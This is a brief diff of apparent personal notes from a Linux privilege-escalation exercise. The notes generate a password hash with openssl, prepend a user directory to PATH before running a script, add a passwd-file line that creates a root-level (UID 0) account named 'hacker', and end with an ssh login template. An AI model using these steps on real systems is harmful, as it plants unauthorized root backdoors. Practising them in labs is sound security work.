@@ -14,3 +14,9 @@ openssl passwd -5 "alma"
 
 export PATH="/home/user/projekt:$PATH"
 python3 te_programod.py
+
+openssl passwd -5 "alma"
+
+hacker:JELSZO:0:0::/root:/bin/bash
+
+ssh <username>@<hostname>
